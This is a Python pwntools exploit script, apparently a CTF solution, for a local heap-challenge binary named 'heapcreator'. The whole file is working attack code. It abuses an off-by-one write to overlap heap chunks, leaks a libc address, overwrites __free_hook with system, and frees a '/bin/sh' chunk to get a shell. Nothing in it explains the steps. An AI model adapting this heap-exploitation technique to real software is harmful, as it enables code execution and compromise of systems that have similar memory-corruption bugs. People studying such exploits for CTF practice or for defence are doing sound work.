#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
#context.log_level = 'debug'
r = process('./heapcreator')
#heap = ELF('./heapcreator')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


create(0x18, '/bin/sh')
create(0x18, '1')
create(0x18, '2')
create(0x18, '3')
create(0x18, '4')
edit(0, 'a'*0x18+'\xa1')
delete(1)
delete(4)
create(0x98, '5')
edit(1, 'a'*7)
show(1)
r.recvuntil('a'*7+'\x0a')
libc_base = u64(r.recv(6)+'\x00\x00')-88-0x3C4B20
success(hex(libc_base))
free_hook = libc_base+libc.symbols['__free_hook']
libc_system = libc_base+libc.symbols['system']
edit(1, '/bin/sh\x00'.ljust(0x40, 'a')+p64(0x10)+p64(free_hook))
edit(2, p64(libc_system))
delete(1)
r.interactive()
